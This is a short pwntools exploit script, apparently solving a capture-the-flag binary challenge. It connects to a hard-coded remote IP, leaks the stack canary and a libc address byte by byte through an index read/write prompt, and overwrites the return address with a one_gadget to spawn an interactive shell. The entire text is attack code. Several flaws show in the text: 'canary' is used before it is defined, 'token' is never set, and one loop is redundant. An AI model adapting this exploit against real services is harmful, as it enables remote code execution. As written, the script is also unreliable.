from pwn import *

#p=process('./pwn')
p=remote("39.106.224.151",57856)
name="n132"
p.sendlineafter("name:",name)
for x in range(7):
	p.sendlineafter("index\n",str(0x149+6-x))
	p.readuntil("(hex) ")
	re=int("0x"+p.readline()[:-1],16)
	re=re&0xff
	canary=re+canary*0x100
	
	p.sendlineafter("value\n",str(re))

base=0

for x in range(6):
	p.sendlineafter("index\n",str(0x278+5-x))
	p.readuntil("(hex) ")
	re=int("0x"+p.readline()[:-1],16)
	re=re&0xff
	base=re+base*0x100
	p.sendlineafter("value\n",str(re))
base=base-(0x7ffff7a2d830-0x00007ffff7a0d000)
log.info(hex(base))
tmp=0
one=0x45216+base
log.info(hex(one))
l=[0xff0000000000,0xff00000000,0xff000000,0xff0000,0xff00,0xff]
for x in range(6):
	p.sendlineafter("index\n",str(0x278+5-x))
	p.readuntil("(hex) ")
	re=int("0x"+p.readline()[:-1],16)
	re=re&0xff
	base=re+base*0x100
	p.sendlineafter("value\n",str((one&l[x])>>(8*(5-x))))
context.log_level='debug'
for x in range(22):
	p.sendlineafter("index\n",str(0))
	p.sendlineafter("value\n",str(0))
p.sendlineafter("es/no)? ","no")
p.sendline(token)
p.interactive()
